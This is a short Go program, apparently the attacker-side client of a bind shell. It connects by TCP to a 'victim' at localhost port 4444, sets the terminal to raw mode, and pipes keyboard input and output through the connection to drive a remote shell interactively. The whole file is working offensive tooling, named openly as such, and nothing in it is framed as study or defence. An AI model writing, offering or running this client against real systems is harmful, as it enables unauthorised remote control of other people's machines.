package main

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"

	"golang.org/x/term"
)

func main() {
	victimIP := "localhost"
	victimPort := "4444"

	conn, err := net.Dial("tcp", victimIP+":"+victimPort)
	if err != nil {
		fmt.Println("Failed to connect to victim:", err)
		return
	}
	defer conn.Close()
	fmt.Println("Connected to victim")

	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		fmt.Println("Failed to set terminal to raw mode:", err)
		return
	}
	defer term.Restore(int(os.Stdin.Fd()), oldState)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		term.Restore(int(os.Stdin.Fd()), oldState)
		os.Exit(0)
	}()

	go func() {
		_, err := os.Stdout.ReadFrom(conn)
		if err != nil {
			fmt.Println("Error reading from connection:", err)
		}
	}()

	_, err = os.Stdin.WriteTo(conn)
	if err != nil {
		fmt.Println("Error sending data to the server:", err)
	}
}
